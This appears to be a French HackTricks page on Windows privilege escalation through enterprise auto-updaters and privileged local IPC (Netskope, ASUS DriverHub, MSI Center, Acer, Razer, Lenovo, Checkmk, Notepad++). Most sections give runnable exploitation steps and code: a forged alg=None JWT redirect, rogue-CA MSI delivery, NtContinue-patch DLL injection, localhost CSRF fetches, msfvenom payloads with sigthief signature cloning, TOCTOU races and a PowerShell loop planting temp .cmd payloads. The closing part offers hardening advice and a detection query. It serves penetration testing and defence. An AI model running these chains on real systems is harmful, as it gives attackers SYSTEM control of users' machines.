# Abus des auto-updaters d’entreprise et de l’IPC privilégié (p. ex., Netskope, ASUS et MSI)

{{#include ../../banners/hacktricks-training.md}}

Cette page généralise une catégorie de chaînes d’escalade de privilèges locaux sous Windows observées dans des agents et des updaters d’entreprise qui exposent une surface IPC facilement accessible et un processus de mise à jour privilégié. Un exemple représentatif est Netskope Client for Windows < R129 (CVE-2025-0309), où un utilisateur à faibles privilèges peut forcer l’inscription auprès d’un serveur contrôlé par un attaquant, puis fournir un MSI malveillant que le service SYSTEM installe.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Principes clés réutilisables contre des produits similaires :
- Abuser de l’IPC localhost d’un service privilégié pour forcer une réinscription ou une reconfiguration vers un serveur contrôlé par un attaquant.
- Implémenter les endpoints de mise à jour du fournisseur, fournir un Trusted Root CA malveillant et diriger l’updater vers un package malveillant « signé ».
- Contourner les vérifications faibles du signataire (listes d’autorisation CN), les indicateurs de digest facultatifs et les propriétés MSI permissives.
- Si l’IPC est « chiffré », dériver la clé/l’IV à partir d’identifiants machine lisibles par tous et stockés dans le registre.
- Si le service limite les appelants en fonction du chemin de l’image ou du nom du processus, injecter du code dans un processus autorisé ou en démarrer un en état suspendu, puis amorcer votre DLL avec une modification minimale du contexte de thread.

Les services TCP locaux personnalisés méritent le même examen de l’identité et des limites d’entrée, même lorsqu’ils exigent un PIN ou un autre identifiant applicatif. Associez l’écouteur à son processus et au compte de service effectif, puis vérifiez le binaire/la version réellement déployés et si les champs contrôlés par l’appelant sont vérifiés quant à leur longueur avant d’être copiés dans des tampons de taille fixe ou utilisés pour construire la commande d’un processus enfant. Les [recommandations de Microsoft pour éviter les dépassements de tampon](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) expliquent pourquoi les entrées externes non vérifiées sont dangereuses dans du code natif privilégié. Un écouteur loopback, un identifiant codé en dur ou un nom de processus ne prouvent pas à eux seuls l’existence d’une corruption mémoire ou d’une exécution en tant que SYSTEM ; l’accessibilité, l’autorisation, le chemin de code et les mesures d’atténuation restent des conditions distinctes. Limitez l’énumération courante à des méthodes passives plutôt que d’envoyer à un service actif des entrées de longueur susceptibles de le faire planter.

---
## 1) Forcer l’inscription auprès d’un serveur contrôlé par un attaquant via l’IPC localhost

De nombreux agents incluent un processus d’interface utilisateur en mode utilisateur qui communique avec un service SYSTEM via TCP localhost à l’aide de JSON.

Observé dans Netskope :
- UI : stAgentUI (low integrity) ↔ Service : stAgentSvc (SYSTEM)
- IPC command ID 148 : IDP_USER_PROVISIONING_WITH_TOKEN

Procédure d’exploitation :
1) Créez un token d’inscription JWT dont les claims contrôlent l’hôte du backend (p. ex., AddonUrl). Utilisez alg=None afin qu’aucune signature ne soit requise.
2) Envoyez le message IPC qui invoque la commande de provisioning avec votre JWT et le nom du tenant :

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Le service commence à contacter votre serveur malveillant pour l’inscription/la configuration, par exemple :
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes :
- Si la vérification de l’appelant repose sur le chemin/nom, envoyez la requête depuis un binaire fournisseur sur liste d’autorisation (voir §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Détourner le canal de mise à jour pour exécuter du code en tant que SYSTEM

Une fois que le client communique avec votre serveur, implémentez les endpoints attendus et orientez-le vers un MSI contrôlé par l’attaquant. Séquence typique :

1) /v2/config/org/clientconfig → Renvoyez une configuration JSON avec un intervalle de mise à jour très court, par exemple :
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Renvoyer un certificat CA PEM. Le service l’installe dans le magasin Trusted Root de l’ordinateur local.
3) /v2/checkupdate → Fournir des métadonnées pointant vers un MSI malveillant et une fausse version.

Contournement des vérifications courantes observées sur le terrain :
- Allow-list du CN du signataire : le service peut uniquement vérifier que le CN du Subject est égal à « netSkope Inc » ou « Netskope, Inc. ». Votre CA rogue peut émettre un certificat leaf avec ce CN et signer le MSI.
- Propriété CERT_DIGEST : inclure une propriété MSI bénigne nommée CERT_DIGEST. Elle n’est pas appliquée lors de l’installation.
- Vérification facultative du digest : un indicateur de configuration (p. ex., check_msi_digest=false) désactive la validation cryptographique supplémentaire.

Résultat : le service SYSTEM installe votre MSI depuis
C:\ProgramData\Netskope\stAgent\data\*.msi
et exécute du code arbitraire en tant que NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Leçon sur le contournement des correctifs : si un fournisseur réagit en ajoutant à une allow-list un petit ensemble de domaines « approuvés » au lieu d’authentifier cryptographiquement la source de la mise à jour, recherchez des redirecteurs ou des reverse proxies appartenant au fournisseur qui vous permettent encore de diriger le trafic. Dans le cas de Netskope, des recherches publiques ultérieures ont montré qu’une allow-list de l’ère R129 pouvait encore être contournée via `rproxy.goskope.com`, qui relayait du contenu Azure App Service contrôlé par un attaquant. Considérez les allow-lists de noms d’hôte comme un ralentisseur, pas comme une frontière de confiance.<sup>[[14]](#references)</sup>

---
## 3) Forger des requêtes IPC chiffrées (le cas échéant)

À partir de R127, Netskope a encapsulé le JSON IPC dans un champ encryptData ressemblant à du Base64. La rétro-ingénierie a révélé un chiffrement AES dont la clé et le vecteur IV sont dérivés de valeurs du registre lisibles par n’importe quel utilisateur :
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Les attaquants peuvent reproduire le chiffrement et envoyer des commandes chiffrées valides depuis un compte utilisateur standard.<sup>[[1]](#references)[[2]](#references)</sup> Conseil général : si un agent se met soudainement à « chiffrer » son IPC, recherchez les identifiants d’appareil, les GUID de produit et les identifiants d’installation sous HKLM qui pourraient servir de matériau.

---
## 4) Contourner les allow-lists des appelants IPC (vérifications du chemin/nom)

Certains services tentent d’authentifier le pair en récupérant le PID de la connexion TCP et en comparant le chemin/nom de l’image à ceux des binaires du fournisseur figurant dans une allow-list et situés sous Program Files (p. ex., stagentui.exe, bwansvc.exe, epdlp.exe).

Deux contournements pratiques :
- Injection de DLL dans un processus figurant dans l’allow-list (p. ex., nsdiag.exe) et relais de l’IPC depuis ce processus.
- Lancer un binaire figurant dans l’allow-list en état suspendu et charger votre DLL proxy sans CreateRemoteThread (voir §5), afin de satisfaire les règles anti-altération appliquées par le driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection compatible avec la protection anti-altération : processus suspendu + patch NtContinue

Les produits intègrent souvent un driver minifilter/OB callbacks (p. ex., Stadrv) qui retire les droits dangereux des handles vers les processus protégés :
- Processus : retire PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread : limite les droits à THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un chargeur en mode utilisateur fiable qui respecte ces contraintes :
1) Créer un processus avec CreateProcess à partir d’un binaire du fournisseur et l’indicateur CREATE_SUSPENDED.
2) Obtenir les handles auxquels vous avez encore droit : PROCESS_VM_WRITE | PROCESS_VM_OPERATION sur le processus, et un handle de thread avec THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou uniquement THREAD_RESUME si vous patchez le code à un RIP connu).
3) Remplacer ntdll!NtContinue (ou un autre thunk précoce dont le mappage est garanti) par un petit stub qui appelle LoadLibraryW sur le chemin de votre DLL, puis revient au code initial.
4) Appeler ResumeThread pour déclencher votre stub dans le processus et charger votre DLL.

Comme vous n’avez jamais utilisé PROCESS_CREATE_THREAD ni PROCESS_SUSPEND_RESUME sur un processus déjà protégé (vous l’avez créé), la politique du driver est respectée.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Outils pratiques
- NachoVPN (plugin Netskope) automatise la création d’une CA rogue, la signature d’un MSI malveillant et la mise à disposition des endpoints nécessaires : /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope est un client IPC personnalisé qui crée des messages IPC arbitraires (éventuellement chiffrés en AES) et intègre l’injection dans un processus suspendu afin d’émettre les requêtes depuis un binaire figurant dans l’allow-list.<sup>[[4]](#references)</sup>

## 7) Workflow de triage rapide des surfaces updater/IPC inconnues

Face à un nouvel agent endpoint ou à une suite d’outils « helper » pour carte mère, un workflow rapide suffit généralement pour déterminer si vous avez affaire à une cible de privesc prometteuse :<sup>[[6]](#references)</sup>

1) Énumérer les listeners loopback et les associer aux processus du fournisseur :

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Énumérer les named pipes candidats :

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Extraire les données de routage stockées dans le registre et utilisées par les serveurs IPC à base de plugins :

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Extrayez d’abord les noms des endpoints, les clés JSON et les IDs de commande depuis le client en mode utilisateur. Les frontends Electron/.NET empaquetés leakent fréquemment le schéma complet :

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Identifiez le véritable prédicat de confiance, pas seulement le code path qui finit par lancer le processus :

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Patterns à prioriser :
- `CryptQueryObject`/l’analyse de certificats sans `WinVerifyTrust` signifie généralement que « le certificat existe » a été considéré comme « le certificat est approuvé », ce qui permet le clonage de certificats ou d’autres techniques de faux signataire.
- Les vérifications par sous-chaîne/suffixe sur `Origin`, `Referer`, les URL de téléchargement, les noms de processus ou les CN de signataire ne constituent pas une authentification. `contains(".vendor.com")` est généralement exploitable avec des domaines similaires contrôlés par un attaquant.
- Si l’interface graphique à faibles privilèges décide que « le fichier est approuvé » et que le broker SYSTEM se contente d’utiliser ce résultat, patcher ou réimplémenter la DLL/JS côté client permet souvent de contourner entièrement cette frontière (validation séparée de type Razer).
- Si le broker copie un payload vers `%TEMP%`/`C:\Windows\Temp`, puis le valide ou le planifie depuis cet emplacement, testez immédiatement les fenêtres de remplacement TOCTOU ainsi que les modules de plug-in voisins qui exposent d’autres wrappers `ExecuteTask()` avec des vérifications moins strictes.<sup>[[6]](#references)</sup>

Pour les cibles qui utilisent beaucoup de named pipes, PipeViewer permet de repérer rapidement les DACL faibles et les pipes accessibles à distance avant de commencer à analyser le protocole en profondeur.<sup>[[11]](#references)</sup>

Si la cible authentifie les appelants uniquement à l’aide du PID, du chemin de l’image ou du nom du processus, considérez cela comme un obstacle mineur plutôt que comme une frontière : injecter du code dans le client légitime, ou établir la connexion depuis un processus autorisé, suffit souvent à satisfaire les vérifications du serveur. Pour les named pipes, [cette page sur l’impersonation client et l’abus des pipes](named-pipe-client-impersonation.md) explique plus en détail cette primitive.

Pour un **broker de nettoyage ou de restauration privilégié**, examinez la frontière de confiance des chemins ainsi que l’ACL du pipe. Un appelant disposant de privilèges inférieurs peut être en mesure de choisir une destination de restauration ou de renommer un artefact de sauvegarde intermédiaire dans un répertoire partagé, même si l’exécutable du service et son répertoire d’installation sont protégés. Vérifiez séparément que l’appelant peut accéder à la commande de restauration, modifier le fichier intermédiaire exact ou son nom, que le broker s’exécute avec une identité plus privilégiée et que son opération de restauration écrit effectivement dans le chemin protégé choisi. Un répertoire intermédiaire accessible en écriture ou un pipe accessible en lecture ne suffit pas à établir l’existence d’une écriture arbitraire privilégiée ; le mappage de destination et le comportement du service nécessitent une revue de code ou des tests contrôlés. N’invoquez pas une commande de nettoyage inconnue pendant une énumération passive, car elle pourrait supprimer des fichiers utilisateur.

---
## 8) Brokers de modules complémentaires modulaires authentifiés uniquement par des signatures de fournisseur (schéma Lenovo Vantage)

Une variante plus récente à rechercher est le **broker RPC à client signé** : un processus de bureau Lenovo signé disposant de faibles privilèges communique avec un service SYSTEM, qui route des commandes JSON vers un ensemble de modules complémentaires décrits par XML sous `%ProgramData%`. Dès qu’une exécution de code est obtenue **dans n’importe quel client signé accepté**, chaque contrat `runas="system"` fait partie de votre surface d’attaque.<sup>[[15]](#references)</sup>

Primitives à forte valeur observées dans les recherches sur Lenovo Vantage :
- **Faire confiance à l’appelant parce qu’il est signé par le fournisseur** : des chercheurs ont obtenu un contexte authentifié en copiant un EXE signé par Lenovo dans un répertoire accessible en écriture et en réalisant un DLL side-load (`profapi.dll`) afin d’exécuter du code arbitraire dans un client déjà approuvé par le service.
- **Découverte de la surface d’attaque pilotée par les manifestes** : les modules complémentaires sont déclarés sous `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` ; plusieurs contrats s’exécutent en tant que `SYSTEM`, donc l’énumération de ces manifestes révèle souvent les véritables commandes privilégiées plus rapidement que l’analyse du broker lui-même.
- **Bugs propres à chaque commande derrière le canal authentifié** : une fois dans le client approuvé, les recherches publiques ont découvert des vulnérabilités de traversée de chemin et de conditions de concurrence dans les commandes de mise à jour/installation, l’abus de SQL brut dans des bases de données de paramètres privilégiées et des vérifications de chemins de registre fondées sur des sous-chaînes qui permettaient des écritures en dehors de la ruche prévue.

Recon utile sur une cible :

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

À retenir en pratique : chaque fois qu’une suite d’outils expose un broker qui authentifie d’abord le **processus appelant**, puis distribue les requêtes à des dizaines de commandes de plugin/add-in, ne vous arrêtez pas après avoir contourné le contrôle de confiance initial. Récupérez la table des manifestes/contrats et fuzziez indépendamment chaque commande à privilèges élevés ; le canal authentifié dissimule généralement plusieurs bugs de seconde étape.

---
## 1) CSRF du navigateur vers localhost contre des API HTTP privilégiées (ASUS DriverHub)

DriverHub fournit un service HTTP en mode utilisateur (ADU.exe) sur 127.0.0.1:53000, qui attend des appels du navigateur provenant de https://driverhub.asus.com. Le filtre d’origine effectue simplement `string_contains(".asus.com")` sur l’en-tête Origin et sur les URL de téléchargement exposées par `/asus/v1.0/*`. Tout hôte contrôlé par un attaquant, comme `https://driverhub.asus.com.attacker.tld`, passe donc la vérification et peut envoyer des requêtes modifiant l’état depuis JavaScript.<sup>[[6]](#references)</sup> Consultez [les bases du CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) pour découvrir d’autres méthodes de contournement.

Déroulement pratique :
1) Enregistrez un domaine contenant `.asus.com` et hébergez-y une page Web malveillante.
2) Utilisez `fetch` ou XHR pour appeler un endpoint privilégié (p. ex., `Reboot`, `UpdateApp`) sur `http://127.0.0.1:53000`.
3) Envoyez le corps JSON attendu par le gestionnaire : le JS frontend empaqueté présente le schéma ci-dessous.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Même la CLI PowerShell présentée ci-dessous réussit lorsque l’en-tête Origin est usurpé avec la valeur de confiance :

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Toute visite du site de l’attaquant dans un navigateur devient donc un CSRF local en 1 clic (ou 0 clic via `onload`) qui déclenche un helper SYSTEM.

---
## 2) Vérification non sécurisée de signature de code et clonage de certificat (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` télécharge les exécutables arbitraires définis dans le corps JSON et les met en cache dans `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validation de l’URL de téléchargement réutilise la même logique de sous-chaîne ; `http://updates.asus.com.attacker.tld:8000/payload.exe` est donc accepté. Après le téléchargement, ADU.exe vérifie simplement que le PE contient une signature et que la chaîne Subject correspond à ASUS avant de l’exécuter : pas de `WinVerifyTrust`, pas de validation de chaîne.

Pour exploiter ce mécanisme :
1) Créez un payload (par ex. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clonez le signer d’ASUS dans celui-ci (par ex. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hébergez `pwn.exe` sur un domaine ressemblant à `.asus.com` et déclenchez UpdateApp via le CSRF du navigateur ci-dessus.

Comme les filtres Origin et URL se basent sur des sous-chaînes et que la vérification du signer compare uniquement des chaînes, DriverHub télécharge puis exécute le binaire de l’attaquant avec ses privilèges élevés.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU dans les chemins de copie/exécution de l’updater (MSI Center CMD_AutoUpdateSDK)

Le service SYSTEM de MSI Center expose un protocole TCP où chaque trame est composée de `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Le composant principal (Component ID `0f 27 00 00`) fournit `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Son handler :
1) Copie l’exécutable fourni dans `C:\Windows\Temp\MSI Center SDK.exe`.
2) Vérifie la signature via `CS_CommonAPI.EX_CA::Verify` (le Subject du certificat doit être égal à “MICRO-STAR INTERNATIONAL CO., LTD.” et `WinVerifyTrust` doit réussir).
3) Crée une tâche planifiée qui exécute le fichier temporaire en tant que SYSTEM avec des arguments contrôlés par l’attaquant.

Le fichier copié n’est pas verrouillé entre la vérification et `ExecuteTask()`. Un attaquant peut :
- Envoyer la trame A pointant vers un binaire légitime signé par MSI (garantissant la réussite de la vérification de signature et la mise en file d’attente de la tâche).
- La faire concurrencer par des messages répétés de trame B pointant vers un payload malveillant, qui écrasent `MSI Center SDK.exe` juste après la fin de la vérification.

Lorsque le planificateur se déclenche, il exécute le payload écrasé en tant que SYSTEM, bien que le fichier d’origine ait été validé. Une exploitation fiable utilise deux goroutines/threads qui envoient en boucle CMD_AutoUpdateSDK jusqu’à gagner la fenêtre TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Exploitation d’IPC personnalisés au niveau SYSTEM et de l’impersonation (MSI Center + Acer Control Centre)

### Jeux de commandes TCP de MSI Center
- Chaque plugin/DLL chargé par `MSI.CentralServer.exe` reçoit un Component ID stocké sous `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Les 4 premiers octets d’une trame sélectionnent ce composant, ce qui permet aux attaquants d’acheminer des commandes vers des modules arbitraires.
- Les plugins peuvent définir leurs propres task runners. `Support\API_Support.dll` expose `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` et appelle directement `API_Support.EX_Task::ExecuteTask()` **sans validation de signature** : n’importe quel utilisateur local peut lui indiquer `C:\Users\<user>\Desktop\payload.exe` et obtenir de manière déterministe une exécution SYSTEM.
- La capture du trafic loopback avec Wireshark ou l’instrumentation des binaires .NET dans dnSpy révèle rapidement la correspondance entre composants et commandes ; des clients personnalisés en Go/Python peuvent ensuite rejouer les trames.<sup>[[6]](#references)</sup>

### Canaux nommés d’Acer Control Centre et niveaux d’impersonation
- `ACCSvc.exe` (SYSTEM) expose `\\.\pipe\treadstone_service_LightMode`, et sa DACL autorise les clients distants (par ex. `\\TARGET\pipe\treadstone_service_LightMode`). L’envoi de l’ID de commande `7` avec un chemin de fichier appelle la routine du service qui lance des processus.
- La bibliothèque cliente sérialise un octet terminateur magique (113) avec les arguments. L’instrumentation dynamique avec Frida/`TsDotNetLib` (voir [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) pour des conseils d’instrumentation) montre que le handler natif associe cette valeur à un `SECURITY_IMPERSONATION_LEVEL` et à un SID d’intégrité avant d’appeler `CreateProcessAsUser`.
- Remplacer 113 (`0x71`) par 114 (`0x72`) mène à la branche générique, qui conserve le jeton SYSTEM complet et définit un SID de haute intégrité (`S-1-16-12288`). Le binaire lancé s’exécute donc avec des privilèges SYSTEM sans restriction, localement comme entre machines.
- Combinez cela avec l’option d’installation exposée (`Setup.exe -nocheck`) pour installer ACC même sur des VM de laboratoire et tester le canal sans matériel du fournisseur.<sup>[[6]](#references)</sup>

Ces bugs IPC montrent pourquoi les services localhost doivent imposer une authentification mutuelle (SID ALPC, filtres `ImpersonationLevel=Impersonation`, filtrage des jetons) et pourquoi les helpers « run arbitrary binary » de chaque module doivent appliquer les mêmes vérifications de signer.

---
## 3) Helpers « elevator » COM/IPC reposant sur une validation faible en mode utilisateur (Razer Synapse 4)

Razer Synapse 4 ajoute un autre exemple utile à cette famille : un utilisateur peu privilégié peut demander à un helper COM de lancer un processus via `RzUtility.Elevator`, tandis que la décision de confiance est déléguée à une DLL en mode utilisateur (`simple_service.dll`) au lieu d’être correctement imposée à l’intérieur de la frontière privilégiée.

Chemin d’exploitation observé :
- Instancier l’objet COM `RzUtility.Elevator`.
- Appeler `LaunchProcessNoWait(<path>, "", 1)` pour demander un lancement avec élévation de privilèges.
- Dans le PoC public, le contrôle de signature PE dans `simple_service.dll` est désactivé par patch avant l’envoi de la requête, ce qui permet de lancer un exécutable arbitraire choisi par l’attaquant.<sup>[[6]](#references)[[10]](#references)</sup>

Invocation PowerShell minimale :

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Conclusion générale : lors de l’analyse inverse de suites « helper », ne vous arrêtez pas au TCP localhost ou aux named pipes. Vérifiez la présence de classes COM portant des noms tels que `Elevator`, `Launcher`, `Updater` ou `Utility`, puis déterminez si le service privilégié valide lui-même le binaire cible ou s’il se contente de faire confiance à un résultat calculé par une DLL cliente en mode utilisateur pouvant être patchée. Ce schéma ne se limite pas à Razer : toute architecture répartie dans laquelle le broker à privilèges élevés consomme une décision d’autorisation ou de refus provenant de la partie à faibles privilèges constitue une surface potentielle de privesc.


---
## Exécution prévisible d’un script temporaire pendant la réparation d’un MSI (Checkmk Agent / CVE-2024-0670)

Certains agents Windows effectuent encore des actions privilégiées en écrivant un fichier `.cmd` temporaire dans `C:\Windows\Temp`, puis en l’exécutant en tant que `SYSTEM`. Si le nom du fichier est prévisible et que le service ne recrée pas correctement les fichiers existants, un utilisateur à faibles privilèges peut créer à l’avance le futur fichier temporaire en lecture seule et amener le processus privilégié à exécuter un contenu contrôlé par l’attaquant au lieu de son propre script.

Observé dans les versions vulnérables de Checkmk Agent :
- motif du fichier temporaire : `cmk_all_<PID>_1.cmd`
- branches concernées : `2.0.0`, `2.1.0`, `2.2.0`
- déclencheur : réparation MSI du package agent mis en cache<sup>[[8]](#references)[[9]](#references)</sup>

Procédure pratique :
1. Estimez une plage réaliste de PID à partir des PID actuels ou du PID de l’agent en cours d’exécution.
2. Écrivez un payload `.cmd` court en **ASCII** (`Set-Content -Encoding Ascii` ou redirection `cmd.exe` ; évitez la sortie PowerShell en UTF-16 pour les fichiers batch).
3. Déployez en masse des fichiers `C:\Windows\Temp\cmk_all_<PID>_1.cmd` dans la plage candidate et marquez chaque fichier en lecture seule.
4. Déclenchez une réparation du MSI mis en cache afin que le service privilégié tente de régénérer le script temporaire, puis l’exécute.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Si le produit vulnérable est installé avec Windows Installer, associez le fichier MSI mis en cache au nom d’apparence aléatoire sous `C:\Windows\Installer` à son nom de produit avant de déclencher la réparation :<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Notes opérationnelles :
- `qwinsta` est utile lorsque `msiexec /fa` échoue depuis un shell WinRM non interactif et que vous devez déterminer si une session de bureau existante ou déconnectée peut déclencher correctement la réparation.<sup>[[7]](#references)</sup>
- Ce schéma s’applique aussi à d’autres agents de terminaux et programmes de mise à jour qui **déposent des scripts temporaires dans des emplacements accessibles en écriture à tous, puis les exécutent en tant que SYSTEM**. Vérifiez la présence de noms prévisibles, l’absence de création exclusive et les flux de réparation/mise à jour pouvant être déclenchés à la demande.

### Réparation interactive de l’installateur et console privilégiée

PDF24 Creator 11.15.1 illustre un risque distinct lié à la réparation MSI : son action personnalisée d’installation de l’imprimante peut ouvrir une console visible avec des droits SYSTEM pendant la réparation. Le fournisseur a modifié l’installateur MSI dans la version 11.15.2 pour corriger ce comportement. Une ancienne version du produit constitue uniquement une piste de triage. Vérifiez le package MSI enregistré ou accessible, si cet utilisateur peut lancer la réparation, si l’action personnalisée vulnérable et le délai lié au fichier journal sont présents, et si un bureau interactif peut rendre la console visible. Le délai signalé reposait sur un oplock sur `faxPrnInst.log` ; le simple fait que le fichier soit accessible en écriture n’est pas la seule condition d’accès. Un shell non interactif, un package inaccessible ou un installateur corrigé peuvent interrompre la chaîne. Ce problème ne dépend pas de `AlwaysInstallElevated` et diffère du remplacement d’un script temporaire prévisible.

---
## Détournement distant de la chaîne d’approvisionnement via une validation faible du programme de mise à jour (WinGUp / Notepad++)

Entre juin 2025 et décembre 2025, des attaquants ayant compromis l’infrastructure d’hébergement utilisée par le processus de mise à jour de Notepad++ ont envoyé sélectivement des manifestes malveillants à des victimes choisies. Les anciens programmes de mise à jour basés sur WinGUp ne vérifiaient pas complètement l’authenticité des mises à jour ; une réponse XML malveillante pouvait donc rediriger les clients vers des URL contrôlées par les attaquants. Comme le client acceptait le contenu HTTPS sans vérifier à la fois une chaîne de certificats de confiance et une signature PE valide sur l’installateur téléchargé, les victimes ont récupéré et exécuté un `update.exe` NSIS trojanisé.<sup>[[12]](#references)[[13]](#references)</sup>

Déroulement opérationnel (aucun exploit local requis) :
1. **Interception de l’infrastructure** : compromettre le CDN/l’hébergement et répondre aux vérifications de mise à jour avec des métadonnées d’attaque pointant vers une URL de téléchargement malveillante.
2. **NSIS trojanisé** : l’installateur récupère/exécute une charge utile et exploite deux chaînes d’exécution :
   - **Binaire signé fourni par l’attaquant + sideload** : inclure le fichier signé `BluetoothService.exe` de Bitdefender et déposer un `log.dll` malveillant dans son chemin de recherche. Lorsque le binaire signé s’exécute, Windows charge `log.dll` par sideload ; cette DLL déchiffre et charge de manière réfléchie la backdoor Chrysalis (protégée par Warbird et utilisant le hachage d’API pour gêner la détection statique).
   - **Injection de shellcode par script** : NSIS exécute un script Lua compilé qui utilise des API Win32 (par exemple, `EnumWindowStationsW`) pour injecter du shellcode et déployer Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Mesures de sécurisation et de détection pour tout programme de mise à jour automatique :
- Exiger la **vérification du certificat et de la signature** de l’installateur téléchargé (épingler le signataire du fournisseur, rejeter les CN/chaînes non concordants) et signer le manifeste de mise à jour lui-même (par exemple, XMLDSig). Bloquer les redirections contrôlées par le manifeste tant qu’elles ne sont pas validées.
- Considérer le **sideload d’un binaire signé fourni par l’attaquant** comme un pivot de détection après téléchargement : déclencher une alerte lorsqu’un EXE signé d’un fournisseur charge une DLL dont le nom provient de l’extérieur de son chemin d’installation habituel (par exemple, Bitdefender chargeant `log.dll` depuis Temp/Downloads), ainsi que lorsqu’un programme de mise à jour dépose/exécute dans un dossier temporaire des installateurs dont la signature n’est pas celle du fournisseur.
- Surveiller les **artefacts spécifiques aux malwares** observés dans cette chaîne (utiles comme pivots génériques) : le mutex `Global\Jdhfv_1.0.1`, les écritures anormales de `gup.exe` dans `%TEMP%` et les étapes d’injection de shellcode pilotées par Lua.
- Notepad++ a renforcé WinGUp dans la version v8.8.9 et les versions ultérieures : le XML renvoyé est désormais signé (XMLDSig), et les versions récentes vérifient le certificat et la signature de l’installateur téléchargé au lieu de se fier uniquement au transport.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideload d’un EXE signé par Bitdefender via <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
